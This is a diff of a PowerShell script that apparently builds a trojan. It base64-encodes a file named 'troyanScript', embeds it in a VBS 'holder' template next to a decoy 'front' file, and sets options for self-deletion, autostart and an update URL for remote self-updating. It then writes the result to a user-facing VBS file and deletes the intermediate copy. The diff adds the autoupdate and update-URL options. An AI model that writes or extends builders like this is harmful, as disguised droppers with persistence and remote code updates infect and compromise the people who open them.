@@ -85,8 +85,11 @@ $body = Encode-FileToBase64 -inFile $server.troyanScript
 
 $holder = Get-Content -Path (Join-Path -Path $scriptDir -ChildPath "holder.vbs")
 
-$result = $holder -replace '__selfDel', 'yes'
-$result = $holder -replace '__autorun', $server.autoStart
+$result = $holder
+$result = $result -replace '__selfDel', 'False'
+$result = $result -replace '__autostart', $server.autoStart
+$result = $result -replace '__autoupdate', $server.autoUpdate
+$result = $result -replace '__updateurl', $server.updateUrl
 $result = $result -replace '0102', $body
 
 ($name, $data) = Create-EmbeddingFiles -name "front" 
@@ -96,3 +99,4 @@ $result = $result -replace '"__frontName"', $name
 
 $result | Set-Content $server.troyanVbsFile
 Copy-Item -Path $server.troyanVbsFile -Destination $server.userVbsFile -Force
+Remove-Item $server.troyanVbsFile
